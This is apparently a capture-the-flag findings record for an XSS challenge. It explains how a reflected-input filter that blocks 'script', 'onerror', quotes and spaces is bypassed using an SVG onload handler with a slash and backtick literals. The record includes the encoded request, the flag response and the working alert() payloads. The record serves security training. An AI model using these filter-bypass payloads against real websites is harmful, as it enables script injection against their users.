findings.title: XSS Challenge 13 - Filter Bypass via SVG/Backtick
findings.description: The /page endpoint reflects the 'name' GET parameter unsanitized into the HTML response. The server-side filter blocks: 'script', 'onerror', single quotes ('), and spaces. Bypassed by using <svg/onload=...> (slash instead of space) with backtick template literals instead of quotes. CTF flag extracted.
findings.evidence:
GET /page?name=%3Csvg%2Fonload%3Dalert%60XSS%60%3E

Response: Congratulations! Here is the flag: flag{0f8d7152-07c4-4be5-a744-e356fafc5a8e}

Working payload: <svg/onload=alert`XSS`>
Also works: <svg/onload=alert("XSS")>
